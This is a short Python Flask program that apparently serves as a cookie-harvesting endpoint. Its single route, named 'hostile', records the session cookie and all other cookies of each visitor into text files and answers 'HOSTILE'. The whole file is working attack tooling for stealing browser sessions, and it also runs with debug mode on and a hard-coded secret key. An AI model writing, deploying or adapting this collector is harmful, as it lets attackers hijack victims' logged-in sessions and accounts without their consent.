import flask # https://flask.palletsprojects.com/en/1.1.x/
from flask import * # https://flask.palletsprojects.com/en/1.1.x/

app = flask.Flask(__name__) # Initiate flask app

app.secret_key = 'ypes79X32BVb1TyMA0qkHxYddzpVz4qrzJLFgs3zHL8' # Set session key different to gui

app.url_map.strict_slashes = False # Dont force trailing / in url

@app.route('/') # landing page
def hostile():
        print(request.cookies) # print current cookies
        f = open("session_db.txt", "a") # Make sure file exists
        f.close() # close file
        with open("session_db.txt", "r+") as f:
                content = f.read() # read file into content varaible
        get_session = request.cookies.get("session") # get sesssion cookie
        if get_session not in content: # prevent duplicates
                with open ("session_db.txt", "a") as f:
                        f.write(get_session + "\n") # append session key
        f.close() # close file

        f = open("cookie_db.txt", "a")  # Make sure file exists
        f.close()
        with open("cookie_db.txt", "r") as f:
                content = f.read() # read file into content variable
        get_cookie = request.cookies.to_dict() # fetch cookies into dict
        get_cookie.pop("session") # remove session from dict
        get_cookie = json.dumps(get_cookie) # convert to json
        if get_cookie not in content: # no duplicates
                with open("cookie_db.txt", "a") as f:
                        f.write(get_cookie + "\n") # append cookie
        f.close()
        return "HOSTILE"

app.run(debug=True, port=3500)